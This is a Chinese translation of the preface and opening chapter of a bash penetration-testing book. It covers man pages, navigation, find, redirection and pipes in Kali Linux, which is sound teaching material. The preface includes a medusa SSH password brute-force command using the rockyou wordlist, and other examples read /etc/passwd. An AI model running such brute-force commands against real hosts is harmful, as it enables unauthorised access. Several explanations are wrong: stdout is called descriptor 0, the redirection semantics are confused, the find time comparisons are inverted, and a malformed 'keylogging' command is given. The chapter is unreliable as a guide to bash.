# BashShell 渗透测试（一）

> 原文：[`annas-archive.org/md5/6225FDC70BEF4B4DDAE2F717656A1F01`](https://annas-archive.org/md5/6225FDC70BEF4B4DDAE2F717656A1F01)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

今天的渗透测试技术充斥着过于简化的图形用户界面。虽然易于使用，但它们通常对其执行的操作提供很少的控制，并且对用户的信息体验不够丰富。另一个缺点是，许多这些安全评估解决方案只是为了识别和自动化利用最明显和未混淆的漏洞实例而开发的。对于其他实际漏洞实例，渗透测试人员需要依靠自己的脚本和评估工具。

一个优秀的渗透测试人员的基本技能包括至少对脚本编写或软件开发语言（如 bash 脚本、Python、Go、Ruby 等）的基本技能。这样他们就可以使用自己定制的工具处理漏洞的奇怪和异常情况，并能够根据自己的条件自动化安全测试。防火墙、入侵检测/防御系统和其他安全监控解决方案变得越来越智能，作为渗透测试人员，我们唯一能够击败它们的方法就是学会构建自己的工具来“武装”我们的命令行。

这本书介绍了一些全球最优秀的渗透测试人员使用的基本技能、技巧和命令行驱动的实用程序，以确保他们尽可能多地控制他们的测试活动。任何有兴趣专门为渗透测试或整体渗透测试引入命令行的人都会从阅读本书中受益。

# 本书涵盖的内容

第一章，“了解 Bash”，向读者介绍了使用 bash 终端涉及的基本概念。它涵盖了读者在日常活动中作为渗透测试人员、系统管理员和安全导向开发人员会发现有用的实用程序。

第二章，“自定义您的 Shell”，着重介绍了读者可以使用的技巧和窍门，以自定义 shell 的行为以满足他们的需求。它向读者展示了如何自定义光标以格式化文本，如何安全地控制命令历史记录，如何使用别名，以及如何启用制表符补全，使命令行实用程序更加用户友好和易于使用。

第三章，“网络侦察”，涵盖了读者可以使用的命令行实用程序，用于执行目标枚举和从常见网络服务中提取信息。本章介绍了许多工具，包括 Dnsmap、Nmap 和 Whois 等，以及将这些工具与其他命令行工具有用地集成的方法。

第四章，“利用和逆向工程”，着重演示和讨论基本的逆向工程和基于主机的利用命令行驱动工具。本章涵盖了诸如 msfcli、msfpayload、GNU gdb 等工具和各种技术，并展示了读者如何借助 bash 脚本以有用的方式结合这些工具。

第五章，“网络利用和监控”，将重点转向网络利用工具和读者在日常渗透测试中可能使用的实用程序。本章涵盖了诸如 ARPSpoof、Ettercap 和 SSLyze 等工具，还向读者介绍了有用的 bash 脚本和命令，优化了这些命令的使用，并自动化了许多常见任务。

# 您需要为本书做好准备

本书唯一的软件要求是 Kali Linux 操作系统，您可以从[`www.kali.org`](http://www.kali.org)以 ISO 格式下载。

# 这本书适合谁

命令行黑客是一本适合任何对学习如何使用 Kali Linux 命令行进行有效渗透测试，以及自动化常见任务并提高使用常见实用程序解决技术安全问题的人的书。渗透测试、安全测试、系统管理和安全工程的新手将从这本书中受益匪浅。

# 约定

在本书中，您会发现一些文本样式，用于区分不同类型的信息。以下是一些样式的示例，以及它们的含义解释。

文本中的代码词显示如下："`[FILE]`或`[DIRECTORY]`参数可以是您希望对其执行`ls`的任何路径或文件。"

代码块设置如下：

```
#!/bin/bash
HOST=$1
SSL_PORT=$2
KEY_LEN_LIMIT=$3
VULN_SUIT_LIST=$4
echo -e "[*] assessing host \e[3;36m $HOST:$SSL_PORT\e[0m"
for cipher in `sslyze --regular $HOST:$SSL_PORT | awk -F\  '/[0-9]* bits/ { print $1"_"$2"_"$3 }'`
```

当我们希望引起您对代码块的特定部分的注意时，相关行或项目将以粗体显示：

```
if [ "$color_prompt" = yes ]; then
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\n\$'
else
 PS1='${debian_chroot:+($debian_chroot)}{\j}\u@[\w]\n\$'
fi
unset color_prompt force_color_prompt 
```

任何命令行输入或输出都将按照以下格式编写：

```
medusa –h 192.168.10.105 –u k3170makan –P /usr/share/wordlists/rockyou.txt –M ssh

```

**新术语**和**重要单词**以粗体显示。您在屏幕上看到的单词，例如菜单或对话框中的单词，会以这样的方式出现在文本中："**全局正则表达式打印**（**grep**）实用程序是所有命令行专家的基本工具。"

### 注意

警告或重要说明会显示在这样的框中。

### 提示

提示和技巧会显示为这样。


# 第一章：了解 Bash

**Bourne Again SHell**（bash）可以说是存在的最重要的软件之一。没有 bash shell 的许多实用程序和它通过可编程方式集成和接口系统实用程序给予用户的问题解决潜力（称为**bash 脚本**），现代世界的许多非常重要的安全相关问题将会非常繁琐。诸如`grep`、`wget`、`vi`和`awk`等实用程序使其用户能够进行非常强大的字符串处理、数据挖掘和信息管理。多年来，全世界的系统管理员、开发人员、安全工程师和渗透测试人员都发誓其强大的问题解决潜力和使他们能够应对日常技术挑战的有效性。

为什么要讨论 bash shell？为什么它在系统管理员、渗透测试人员和开发人员中如此受欢迎？嗯，可能还有其他原因，但基本上 bash shell 是最标准化的，通常情况下，关于最流行的操作系统，它是从单一代码库实现的——官方源代码的一个来源。这意味着可以保证一定的基本执行行为集合，无论托管 bash 实现的操作系统是什么。操作系统通常具有**Korn Shell**（ksh）和其他终端仿真器软件的独特实现。

Linux 或 Unix 环境的唯一缺点（如果有的话）是，对于大多数人，特别是那些习惯于图形用户界面（GUI）的人来说，学习曲线可能会有点陡峭。这主要是因为信息呈现的方式。对于新手来说，通常很难欣赏到 Linux/Unix 文化和惯例，可能是因为缺少工具提示、提示和丰富的图形交互设计和用户体验工程 GUI 的缘故。本书特别是本章将介绍一些巧妙但精彩的 Linux/Unix 文化和惯例，以便您可以对 bash shell 感到足够舒适，并最终找到自己的方式，并在本书的后面跟随更高级的主题。

在整本书中，将讨论的 bash 环境或主机操作系统将是 Kali Linux。Kali Linux 是从 Debian 改编的发行版，它装载了专注于技术安全问题解决和测试的实用程序。因为熟练使用终端与了解您的操作系统及其各种细微差别密切相关，本章和接下来的章节将介绍一些与 Kali Linux 操作系统相关的主题，其配置设置和默认行为，以便您能够正确使用您的终端实用程序。

如果您已经是一个经验丰富的“basher”，请随意跳过本章，转而阅读本书中更加关注安全的主题。

# 从 man 页面获取帮助

Bash shell 通常捆绑了一个非常有用的实用程序，称为 man 文件，简称手册文件。这是一个实用程序，为您提供了一个标准化的格式，用于记录 Unix/Linux 环境中大多数实用程序、库甚至系统调用的目的和用法。

在接下来的章节中，我们将经常使用 man 文件中使用的惯例和描述风格，以便您可以舒适地切换到使用 man 页面来支持您在接下来的章节和章节中学到的内容。

使用 man 文件非常容易；您只需要从终端中发出以下命令：

```
man [SECTION NUMBER] [MAN PAGE NAME]

```

在上一个命令中，`[SECTION NUMBER]`是要引用的手册页部分的编号，`[MAN PAGE NAME]`是手册页的名称。通常，它是命令、系统调用或库本身的名称。例如，如果您要查找 man 命令本身的手册页，您将从终端执行以下命令：

```
man 1 man

```

在上一个命令中，`1`告诉 man 使用第 1 部分，后面跟着的`man`参数是手册页的名称，也是页面专用的命令的名称。

手册页的各个部分按照它们自己的规范编号。以下是这些数字的分配方式：

1.  常用命令：通常使用此部分查找有关命令行使用的命令的信息。在本节的前一个示例中，我们使用它来查找有关手册文件的信息。

1.  系统调用：本节记录了主机操作系统支持的常见系统调用的参数和目的。

1.  C 库函数：对于 C 开发人员和使用 C 衍生语言（如 Python）的开发人员来说，这一部分非常有用。它将为您提供有关某些基本 C 库函数调用的参数、定义头文件、行为和目的的信息。

1.  特殊文件：本节记录了特殊用途的文件，通常位于`/dev/`目录中，例如字符设备、伪终端等。尝试选择操作系统`/dev/`目录中的一些文件，并执行以下命令：

```
man 4 [FILENAME]
```

例如：

```
man 4 pts
man 4 tty 
man 4 urandom
```

1.  文件格式和约定：本节记录了用于构造有关系统信息的常见文件格式，例如日志文件格式、密码文件格式等。通常，任何文件都用于记录常见操作系统实用程序生成的信息。

1.  游戏和屏幕保护程序：本节包含有关游戏和屏幕保护程序的信息。

1.  杂项：本节包含有关杂项命令和其他信息的信息。它用于记录任何不适合其他类别的文档。

1.  系统管理命令和守护进程：本节专门介绍管理命令和系统守护进程的信息。

有关这些部分的概要和完整描述，请尝试查看每个部分的介绍手册文件。您可以通过执行以下命令来访问这些文件的每个部分编号：

```
man [SECTION NUMBER] intro

```

我在这里记录了所有手册页部分编号及其传统用途。当然，开发人员要遵守这些约定，但通常您只会对第 1 部分感兴趣，如果您要进行一些逆向工程，第 2、3 和 4 部分也将非常有帮助。

手册页布局标准化，包含一定的部分集合。手册页的每个部分描述了所讨论的命令、系统调用或库的特定属性。以下列表解释了手册文件中常见部分的目的：

+   名称：这是命令、函数、系统调用或文件格式的名称。

+   概要：这是对命令、系统调用、文件格式等的正式描述，描述了使用规范。命令的语法或使用规范的指定方式需要一些理解才能正确理解。您可能会注意到规范中的大括号，这些不应被解释为命令调用的文字部分。实际上，它们表示括号内出现的任何内容都是可选参数。此外，"|"字符表示命令调用中可以指定其前面或后面的符号，但不能同时指定；将其视为逻辑或。

+   **描述**：这是 man 页面主题的非正式描述和讨论，详细说明了其目的以及在概要部分提到的选项和可能的参数的更多信息。

+   **示例**：这是 man 页面主题用法的示例集合。

+   **另请参阅**：这是包含有关正在讨论的主题的更多信息的参考资料、网页和其他资源的集合。

有关 Linux 手册页面的更多信息，请参阅本章末尾的*进一步阅读*部分。

# 导航和搜索文件系统

导航和搜索 Linux 文件系统是开发人员、系统管理员和渗透测试人员需要掌握的最基本技能之一，以实现其 bash 控制台和实用程序的全部潜力。要正确掌握这项技能，您需要对主机操作系统的组织有很好的理解，尽管在这本书的上下文中，对 Kali Linux 操作系统的内部工作和组织进行深入讨论有点脱离了主题。

导航文件系统需要使用一系列工具和实用程序的样本集。以下是这些工具的分解：

| 命令名称 | 通用名称 | 目的 |
| --- | --- | --- |
| `cd` | 更改目录 | 更改当前工作目录 |
| `ls` | 列表 | 列出当前工作目录的内容 |
| `pwd` | 打印工作目录 | 显示当前工作目录 |
| `find` | 查找 | 根据某些属性的值定位或验证文件的存在 |

## 导航目录

导航目录通常使用`cd`命令完成，这可能是最简单的命令之一。您只需要提供要更改的目录，`cd`将完成其余工作。它还具有非常有用的快捷方式，可以加快用户在导航文件系统时执行的最常见任务。

以下是命令使用规范的样子：

```
cd [ -L | -P ] [directory]

```

在语法规范中，`[directory]`是您希望将当前工作目录更改为的目录，`[-L|-P]`可以是以下任何一个：

+   `-L`：更改目录时，不应尊重符号链接。当前目录将更改为包括符号链接的名称，而不是其目标。这在文档中被描述为使符号链接逻辑，因为它强制符号链接的名称被视为路径中的逻辑元素。

### 注意

符号链接是文件系统上的构造，允许一个文件或目录纯粹作为对另一个文件的引用。这些链接会影响路径解析的方式，因为在某些情况下，当跟随符号链接时，它将允许一个路径将当前目录指向由另一个名称表示的文件，而不是严格按照路径名解析。

+   `-P`：这是`-L`命令的相反。这指定如果要设置为当前目录的文件是符号链接，则应在设置为当前目录之前完全解析它。这意味着如果您访问符号链接，您的当前路径将不会反映您用于到达它的符号链接的名称，除非当然该链接与其目标具有相同的名称。

以下是`cd`命令的典型用法示例：

```
cd / 

```

上述命令将更改您的当前目录到根目录，即名为`/`；通常情况下，您的文件系统上托管的所有内容都可以从此目录访问。

以下是一些更多的例子：

+   `cd ~`：此命令用于导航到当前用户的主目录

+   `cd ../`：此命令用于导航到当前目录直接上面的目录

在上述命令中，可以通过提供以下命令使`cd`导航到当前目录上面的任意数量的目录，例如：

```
cd ../../../../../

```

以下是可以用于导航到不同目录的一些其他命令：

+   `cd .`：这个命令用于导航到当前目录

+   `cd –`：这个命令用于导航到上一个目录

+   `cd --`：这个命令用于导航到倒数第二个目录

要查看您是否确实将当前工作目录更改为指定的目录，可以调用`pwd`命令，该命令将打印您的工作目录。`pwd`命令的语法如下：

```
pwd [-L|-P] [--help] [--version]
pwd [--logical | --physical ] 

```

`–L`或`--logical`和`–P`或`--physical`调用选项与`cd`命令中的作用相同。

## 列出目录内容

仅仅在目录之间移动是不够的。最终，您会想要找出这些目录里面有什么。您可以使用`ls`命令来做到这一点。

以下是`ls`命令的用法规范——改编自其 man 页面：

```
ls [-aAlbBCdDfFghHiIklLmNopqQrRsStTuvwxXZ1] [FILE/DIRECTORY]

```

前一个命令规范是另一个流行的 Linux/Unix 约定。这是一种简写，指定括号中出现的任何字母都可以作为命令调用的一部分。同时可以指定任意数量。例如，考虑以下命令：

```
ls –Ham
ls –and
ls –Rotti

```

根据命令规范，它们都是使用`ls`命令的可接受方式。这些是否会真正做一些有用的事情取决于每个开关如何影响`ls`命令的行为。您应该记住，某些选项可能具有相反的效果，或者某些组合可能没有效果，例如阅读`ls`的用法规范时的一般注意事项。

`[FILE]`或`[DIRECTORY]`参数将是您希望触发`ls`的任何路径或文件。没有任何参数，`ls`将列出当前工作目录的条目。

### 注意

开关是指命令调用的一部分，即紧随连字符后面的任何选项的流行行话。例如，`-l`是一个开关。

以下是一些开关的作用——为了简洁起见，我们只讨论一些最重要的开关。请记住，`ls`命令列出目录内容，因此它的所有选项都将专注于以指定的方式组织和呈现给定目录的内容。

以下是一些`ls`命令的调用选项：

+   `-a –-all`：这会显示所有目录条目，并且不会省略以“.”开头的目录或文件。

+   `-d –directory`：这会列出目录条目而不是它们的内容。这也会强制`ls`不解引用符号链接。

+   `-h`：这会以人类可读的格式打印大小，例如，而不仅仅是字节的数量，它将显示以 GB、KB 或 MB 为单位的文件大小。

+   `-i`：这会打印每个文件的**inode**号码。

### 注意

索引节点或`i-nodes`是分配给文件的数据结构，表示有关它们的访问权限、访问时间、大小、所有者以及文件在实际块设备上的位置的详细信息——物理介质托管文件——以及其他重要的维护导向的细节。

+   `-l`：这以长格式列出条目。

+   `-R –-recursive`：这会递归列出目录内容。这告诉`ls`嵌套所有指定路径的级别，并枚举所有可达的文件路径，而不是一旦列出工作目录就停止——这是默认行为。

+   `-S`：这会按文件大小列出条目。

+   `-x`：这会按扩展名按字母顺序对条目进行排序，例如，所有 PDF 文件在 MP3 文件之后。

以下是这些选项在实际操作中的一些示例。例如，如果您想要按文件大小对一堆文件进行排序，同时显示人类可读的文件大小和所有访问权限和创建时间——这似乎是很多工作——您将运行以下命令：

```
ls –alSh

```

你的输出可能看起来像下面的截图：

![列出目录内容](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_05.jpg)

另一个非常有用的例子是检查系统的登录量。这可以通过查看以下命令的输出来完成：

```
ls –alSh /var/log/auth* 

```

通常，跟踪`/var/log/`目录的内容将始终是抓取系统活动的良好概要的好方法。

## 搜索文件系统

另一个重要的技能是以一种紧凑而强大的方式在文件系统中查找资源。其中一种方法是使用名为`find`的命令。以下命令是`find`的工作方式：

```
find [-H] [-L] [-P] [-D debugopts] [-0level] [path…] [expression]

```

您可以通过查看有关`find`命令的 man 文件来了解更多信息。这可以通过执行以下命令来完成：

```
man 1 find. 

```

这在本章的*从 man 页面获取帮助*部分中已经讨论过。

接下来，前三个开关，即`-H`，`-L`和`-P`，都控制符号链接的处理方式。以下列表告诉它们的作用：

+   `-H`：这告诉`find`不要跟随符号链接。符号链接将被视为普通文件，不会将其解析为其目标。简单地说，如果目录包含符号链接，则符号链接将被视为任何其他文件。这不会影响作为选择标准一部分的符号链接；这些将被解析。

+   `-L`：这会强制`find`跟随正在处理的目录中的符号链接。

+   `-P`：这会强制`find`将符号链接视为普通文件。如果在执行过程中遇到符号链接，`find`将检查符号链接本身的属性，而不是其目标。

`-D`开关用于允许`find`在搜索所需文件时打印调试信息，如果您需要了解`find`正在进行的操作。`-0level`控制`find`如何优化测试，还允许您重新排序一些测试。`level`部分可以指定为 0 到 3 之间的任何数字（包括 0 和 3）。

参数中的`[path...]`部分用于告诉`find`在哪里查找文件。您还可以使用`.`和`..`的简写来指定当前目录和上一级目录，就像`cd`命令一样。

下一个参数，或者说一组参数，是非常重要的：`[expression]`。它包括控制以下内容的所有参数：

+   **选项**：这告诉`find`应该寻找什么类型的文件

+   **测试**：这告诉如何识别它正在寻找的文件

+   **操作**：这告诉`find`在找到文件后应该做什么

以下是`find`表达式的结构分解：

```
[expression] := [options][[test][OPERATOR][test][OPERATOR]...][actions]

[options] :=  [-d][-daystart][-depth][-follow][-help]...
[tests] := [-amin n][-atime file][-cmin n][-cnewer file]...
[OPERATOR] := [()][!][-not][-a][-and][-or]...
[actions] := [-delete][-exec command [;|{} +]][-execdir command]...
```

### 注意

先前的代码仅用作有关表达式结构的信息，以便让您知道哪些选项放在哪里。为简洁起见，每个部分的许多开关都已被省略。`:=`字符意味着左侧的任何内容都由右侧定义。

现在您知道所有内容的位置，让我们看看其中一些参数的作用。`find`命令具有许多非常强大的选项和操作模式，一个人可以完全写一本关于`find`本身的书。因此，为了确保您不会因为购买一本关于“命令行黑客”的书而只了解`find`，我们将仅讨论一些最常见的选项和参数，渗透测试人员、系统管理员和开发人员使用。`find`命令的其余功能可以从 Linux 手册文件中学习。

以下是`find`命令可能的选项、测试和操作的摘要。

### 目录遍历选项

以下是您可以与`find`一起使用的一些选项参数：

+   `-maxdepth n`：这指定测试必须仅应用于当前目录下最多*n*级的目录中的条目。如果你正在搜索具有类似结构的目录，这个选项很有用。例如，如果你正在搜索的每个目录下都有一个类似`lib`目录，其中包含不感兴趣的文件，你可以通过指定这个选项来跳过所有这样的目录。

+   `-mindepth n`：这指定测试应该仅应用于深度至少为*n*的目录低于指定路径的文件。

+   `-daystart`：这会强制任何`-amin`、`-atime`、`-cmin`、`-ctime`或等效的与时间相关的测试使用从当前日期开始的时间，而不是 24 小时前的时间，这是默认行为。

+   `-mount`：这禁止`find`进入其他文件系统。

### 注意

`find`命令允许你使用方便的简写来指示使用指定时间进行“至少”或“至多”类型的比较的数值参数：

+   `+n`：这表示指定的参数要比*n*大，或至少是*n*

+   `-n`：这表示指定的参数要比*n*小，或至多是*n*

+   `n`：这会强制 find 将`n`作为原样比较，属性必须具有精确的值`n`

### 文件测试选项

测试被应用于一个文件，要么返回`true`，要么返回`false`：要么被测试的文件具有所需的属性，要么没有。也可以提供多个测试，这种情况下将应用逻辑组合，也可以指定。默认情况下，如果没有提供布尔值来组合测试，将假定逻辑 AND。这意味着文件必须同时满足两个测试才能被*找到*或*报告*。以下是一些文件测试选项：

+   `-amin n`：这指定文件的最后访问时间应该是*n*分钟前。例如：

+   `-amin 20`：这意味着文件必须在 20 分钟前被访问过

+   `-amin +35`：这意味着文件最多在 35 分钟前被访问过

+   `-atime n`：这指定文件应该在*n*24*小时前被访问，也就是*n*天。这个数字的小数部分将被忽略。

+   `-mmin n`：这指定文件应该在*n*分钟前被修改。

+   `-mtime n`：这与`-atime`相同，只是匹配文件的修改时间。

+   `-executable | -readable | -writable`：这匹配任何具有访问权限的文件，表明文件是可执行的、可读的或可写的。

+   `-perm`：这个模式指定文件组应该是名称。`-perm`选项提供了许多不同的方式来指定正在测试的访问模式，下面是它的工作原理。

### 注意

访问模式位可以以以下任何一种为前缀：

+   `mode`：这意味着没有前缀，模式必须完全匹配。

+   `-mode`：这意味着文件的模式必须至少设置了指定的位。这将匹配具有其他位设置的文件，只要指定的位也设置了。

+   `/mode`：这意味着文件必须设置任何指定的位。

模式本身也可以用两种不同的方式来指定，一种是使用字符来表示用户类型和访问模式，另一种是使用八进制十进制模式规范。

+   `-iname nAmE`：这指定文件的名称应该与`nAmE`匹配，如果忽略大小写；换句话说，是不区分大小写的名称匹配。

+   `-regex pattern`：这将指定的模式与文件的路径名作为正则表达式进行匹配。你的正则表达式必须描述整个路径名。

### 注意

正则表达式只是描述具有指定数量共同属性的一组字符串的方式。如果你想描述一个字符串，你必须能够从头到尾详细说明字符串的所有属性。如果你没有以某种方式描述单个字符，正则表达式就不会匹配！

正则表达式本身就是一种语言，例如，您可以编写一个正则表达式来描述正则表达式！这意味着您需要知道如何使用这种语言才能正确使用正则表达式。要了解如何做到这一点，请参阅本章末尾的*进一步阅读*部分。

以下是`-regex`选项使用的一些简单示例：

+   查找所有直接位于`/etc/`目录下以字母`p`开头并以任何内容结尾的文件，使用以下命令：

```
find / -regex '^/etc/p[a-z]*$'

```

+   查找文件系统上称为配置的所有文件，忽略大小写，并使用以下命令适应缩写，如`confg`、`cnfg`和`cnfig`：

```
find / -regex '^[/a-z_]*[cC]+[Oo]*[nN]+[fF]+[iI]*[gF]+$'

```

请参阅以下屏幕截图，以了解先前命令的实际示例：

![文件测试选项](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_06.jpg)

这里使用的正则表达式必须描述整个文件的路径！例如，考虑以下两个正则表达式之间的结果差异：

```
find / -regex '^[/a-z_]*/$' #matches only the / directory
find / -regex '^[/a-z_]*/*$' #matches everything reachable from the / directory!

```

### 提示

**Bash 脚本注释**

任何传递给 bash 解释器并在井号字符之前的 bash 命令或文本都被视为注释，并且不会被解释。

### 文件操作选项

以下是您可以与`find`一起使用的一些操作参数：

+   `-delete`：此操作强制`find`删除指定测试返回`true`的任何文件。例如，考虑以下命令：

```
find / -regex '^/[a-z_\-]*/[Vv][iI][rR][uS]*$' –delete

```

这个命令将查找并删除从根目录可达的任何名称为'virus'的文件——不区分大小写。

+   `-exec`：这允许您指定要在所有匹配文件上执行的任意命令。

这个论点的工作方式是构建一个命令行——这可能会传递给一些`exec*`类型的系统调用——使用`find`操作的结果。`find`命令将使用`-exec`开关后的任何参数作为要执行的命令的文字参数，并将`{}`字符的任何实例作为文件名的占位符，直到遇到`;`字符为止。

例如，考虑以下作为`-exec`参数：

```
find /etc/ -maxdepth 1 -name passwd -exec stat {} \;

```

实际的命令行将看起来像以下命令，因为唯一匹配的文件将是`/etc/passwd`：

```
stat /etc/passwd

```

请参阅以下屏幕截图，以比较`stat`和`find -exec`命令：

![文件操作选项](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_07.jpg)

+   `-execdir`：这与`-exec`的工作方式相同，只是它将指定的命令的执行隔离到匹配文件的目录中。如果您想要根据具有某些文件的目录的内容执行命令，这将非常有效。例如，您可能希望编辑所有没有`.vimrc`的用户的`.bashrc`文件，这是 VIM 文本编辑器的配置脚本。我们稍后将讨论更多关于`.bashrc`代码的内容。

+   `-print0`：这将文件的完整名称打印到标准输出。此参数还具有终止文件名的 NULL 字符或`0x0`字符的附加好处，以便允许文件名包含换行符。它还有助于确保任何解释 find 输出的程序能够确定文件名之间的分隔，因为它们将严格由 NULL 字符分隔。

### 注意

NULL 字符传统上用于标记字符字符串的结尾。NULL 字符本身在内存级别表示为`0`值，以便编译器和操作系统可以清楚地识别内存中出现的字符串之间的分隔。

+   `-ls`：这通过执行`ls -dils`列出当前文件，并将输出打印到标准输出。`-dils`选项确保打印目录条目。如果匹配的文件是目录，则打印 inode，并且该条目以`ls`命令的长列表格式以及文件的大小出现。

还有一些其他操作可以指定。有关其余操作，请参阅`find`命令的手册文件，您可以使用`man find`命令访问该手册文件。

所以就搜索文件系统中的文件、目录或其他任何有趣的东西而言，基本上就是这样。您需要掌握的下一个基本技能是将一个命令的输出重定向到另一个命令。

# 使用 I/O 重定向

当涉及到 bash 脚本时，I/O 重定向是最容易掌握的事情之一。只需知道您希望将输入发送到何处以及它来自何处即可。这可能看起来是一个非常有趣的话题，您可能不明白为什么需要了解这一点，但是重定向输出——如果您真正理解了它的全部意义——将是您在命令行上几乎 80%的时间所做的事情！这本质上是唯一的事情，它允许您以一种紧凑而简单的方式在命令行上组合不同的实用程序并使它们相当有效地一起工作。例如，您可能希望通过将其输出传递给另一个文件或程序来分析来自`nmap`、`tcpdump`或键盘记录器的输出。

## 重定向输出

要将从命令行调用的一个程序的输出重定向到文件中，您只需要在该程序的命令行末尾添加一个`>`符号，然后跟上文件名即可。

例如，使用最近的示例，如果您想将`find`命令的输出重定向到名为`writeable-files.txt`的文件中，可以这样做：

```
find / -writeable > writeable-files.txt 

```

不过，关于这种 I/O 重定向有一个小细节，就像许多常见的 bash 简写一样：在幕后通常有很多事情发生。如果像之前演示的那样使用，实际上只有输出到通常称为文件描述符 0 的标准输出文件的输出才会出现在所选择的文件中（对于上一个示例，它是`writeable-files.txt`），这是正常输出的默认目的地。

### 注意

文件描述符是操作系统中的构造，表示对物理存储机制或文件的实际部分的访问。文件描述符只不过是与内核管理的表示打开文件的其他数据结构相关联的数字。每个进程都有自己的“私有”文件描述符集。

每当您使用文本编辑器打开文件或通常对存储在物理介质上的资源进行任何编辑时，表示所涉及文件的文件描述符将通过系统调用传递给内核。然后内核使用这个数字来查找关于文件的其他细节，这些细节只有内核才能访问的数据结构中。

文件描述符的主要目的是帮助抽象和逻辑上隔离有关访问存储机制的实际过程的细节。毕竟，读写文件对计算机系统来说是非常重要的操作，如果写入文件意味着需要执行旋转/停止硬盘驱动器盘、解释不同文件系统的组织以及处理读/写错误等操作，那将会非常繁琐和容易出错！

可以重定向任何文件描述符的输出，只要您从 bash shell 具有正确的访问权限！以下是执行此操作的代码：

```
[command line] a>&b > [output file]

```

在上一个命令中，`a`和`b`都是文件描述符。如果`a`或`b`没有明确设置，那么它们默认为 1，即标准输出。

那么输出到标准错误文件的输出怎么重定向呢？事实证明这也很简单，以下是执行此操作的代码：

```
[command] 2> [output file]

```

如前面的示例所示，我们指定了重定向符号`2>`，它的意思很简单：

> 将文件描述符 1 的所有内容重定向到名为`writeable-files.txt`的文件中。

您还可以组合或绑定两个标准输出文件，即如果标准错误输出中有任何有趣的内容被打印出来，可以将输入和输出的输出发送到单个文件中。使用以下命令完成：

```
[command line] 2>&1 > [output file]

```

这也有一个更简单的缩写，看起来像这样：

```
[command line] &> [output file]

```

这意味着以下内容：

> 将所有从文件描述符 1 重定向到文件描述符 0，然后将所有从文件描述符 0 重定向到`[output file]`。

前面的重定向命令都假定指定的文件不存在；如果存在，被重定向的输出将覆盖文件中当前的内容。如果您想要将文本附加到文件中，您会怎么做呢？以下命令展示了如何实现：

```
[command line] [&][n] >> [&][m] [filename.txt]

```

与以前一样，`&`、`n`和`m`标记都是可选参数，与以前的示例完全相同。

## 重定向输入

如果您可以重定向输出，那么您也应该能够使用以下命令重定向输入：

```
[command line] < [input file | command line]

```

这实际上非常简单：如果`>`表示重定向输出，那么`<`表示重定向右操作数的“输出”，从左操作数的角度来看，这是输入。

与输出重定向一样，您还可以使用以下命令控制要包括在重定向中的文件描述符：

```
[command line] <[n] [input file | command line]

```

在前面的命令中，`[n]`是文件描述符号码，与输出重定向一样。以下是您可以在终端控制台上测试的一些示例：

+   `keylogs.txt < /dev/`tty``

前面的命令将所有写入终端的输入重定向到名为`keylogs.txt`的文件中。它通过使用`tty`命令获取与终端控制台关联的当前`tty`设备来实现这一点。

+   `wc -l < /etc/passwd`

前面的命令将输入重定向到包含所有用户名和其他用户账户相关详细信息的`/etc/passwd`文件，以便使用`wc`命令来计算行数、文件大小和其他文件属性。使用`-l`开关会导致`wc`命令计算所有行，或者更具体地说，直到达到文件结束（`EOF`）标记为止，遇到的所有换行符。

# 使用管道

在本节中我们讨论的所有内容都是将输出命令重定向到另一个文件；那么将一个命令的输出重定向到另一个命令呢？下一节正是为此而设。

### 注意

管道是进程间通信机制，允许进程在允许一个进程的输出被传送到另一个进程作为输入的操作系统中相互通信的机制。换句话说，您可以将一个程序的标准输出转换为另一个程序的标准输入。

实际上，许多管道的工作方式都是通过复制文件描述符 0 来为一个进程工作，并允许另一个进程向其写入。

以下命令显示了如何在 bash 中使用管道：

```
[command line] | [another command line]

```

请注意，这次`|`字符，如果以这种方式使用，被称为管道，实际上是命令调用的实际部分。当然，`[command line]`将是您想要调用的命令。管道将把第一个命令行的输出作为第二个命令行参数的输入。您实际上可以指定尽可能多的管道，看起来会像以下语法：

```
[command] | [command] | [command] | ... | [command]

```

以下是一些示例：

+   `cat /etc/passwd | wc -l`

+   这相当于以下内容：

```
 wc –l < /etc/passwd

```

+   以下截图显示了上一个命令的输出：

![使用管道](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_08.jpg)

+   使用以下命令计算操作系统的`root`目录中的文件数：

```
ls –al / | wc –l

```

+   使用以下命令列出所有可用的用户名：

```
cat /etc/passwd | awk –F: '{print $1}'

```

以下截图显示了上一个命令的输出：

![使用管道](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-bash-sh/img/5107OT_01_09.jpg)

+   使用以下命令列出`nmap`扫描的所有开放服务：

```
nmap –v scanme.nmap.org | grep –e '^[0-9]*/(udp|tcp)[\ ]*open'

```

# 了解 grep

**全局正则表达式打印**（**grep**）实用程序是所有命令行专家的基本工具。`grep` 实用程序在其最基本的功能中使用户能够在给定的输入文件或流上运行正则表达式，并打印匹配的结果。`grep` 的更高级功能允许您指定您想要打印的匹配文本的哪些属性，是否要对输出进行着色，甚至您应该打印匹配输出周围的多少行。它充满了许多非常有用的功能，一旦掌握，它们将成为任何渗透测试人员、开发人员或系统管理员工具箱的重要组成部分。

### 提示

要正确使用 `grep`，您至少需要基本的理解和实践正则表达式。正则表达式不会在这里完全涵盖，但会涵盖简单的示例和正则表达式语言的基本元素。有关正则表达式及其工作原理的更广泛阅读，请参阅本章末尾的 *进一步阅读* 部分。

## 正则表达式语言 - 速成课程

正则表达式只是描述使用特殊语言的字符串的集合 - 在形式语言理论术语中，任何字符串的集合或集合被称为语言。能够运用这种语言是一项无价的技能。它将帮助您从静态代码源分析、逆向工程、恶意软件指纹识别和更大的漏洞评估以及利用开发等许多方面。

`grep` 支持的正则表达式语言充满了有用的简写，以简化一组常见字符串的描述，例如，描述由任何十进制数、任何小写或大写字母字符或甚至任何可打印字符组成的字符串。因此，鉴于任何字符串或字符串集合必须由一组较小的字符串组成，如果您知道如何匹配或描述任何字母字符或任何十进制数，您应该能够描述由这些字符类中的字符组成的任何内容。字符类只是由特定字符集合中的长度为 1 的字符串组成的语言。

